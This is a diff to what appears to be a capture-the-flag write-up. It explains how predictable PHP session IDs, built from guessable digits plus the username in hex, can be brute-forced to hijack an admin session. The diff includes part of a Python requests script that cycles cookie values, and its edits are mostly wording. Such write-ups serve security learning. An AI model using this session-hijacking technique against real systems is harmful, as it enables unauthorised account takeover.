@@ -16,16 +16,16 @@ Playing around with different username + passwords via burp you can observe that
     b,a = 3239372d62
     b,b = 3632392d62
 
-The last two digits change depending on the username. They are also the hex values for the character if you consult an [ASCII Table](https://www.rapidtables.com/code/text/ascii-table.html).
+The last two digits change depending on the username. They are also the hex values for the corresponding character if you consult an [ASCII Table](https://www.rapidtables.com/code/text/ascii-table.html).
 
-If you know resend the same credentials (a, a) multiple times, you'll observe that the session ID always ends with _2d61_. A bit more playing around reveals a structure like this for the session id:
+If you know resend the same credentials (a, a) multiple times you'll observe that the session ID always ends with _2d61_. A bit more playing around reveals a structure like this for the session id:
 
       *something_that_changes* + *static_2d* + *username_in_ascii*
 
 
 This means we only need _*something_that_changes*_, the rest we can predict / extract. 
 
-Spamming a bit more, it seems like _*something_that_changes*_ are just one, two or three numbers, each of them being between 30 and 40. This was good enough for me to try to brute-force it - with success! Here is the code.
+Spamming a bit more, it seems like _*something_that_changes*_ are just one, two or three numbers, each of them being between 30 and 40. This was good enough for me to try to brute-force it - just guess the numbers and predict the ending of the cookie for someone with the username _admin_ and see whether we find a session we can hijack! Here is the code.
 
 ```python
     import requests, itertools
@@ -42,7 +42,7 @@ Spamming a bit more, it seems like _*something_that_changes*_ are just one, two 
 
             print(f"Testing: {sess_id}")
             cookies = {"PHPSESSID" : sess_id}
-            resp = session.post(url, cookies=cookies)
+            resp = session.post(url, cookies=cookies) #Try to hijack the session.
 
             if(not "regular user" in resp.text):
                 print(resp.text)
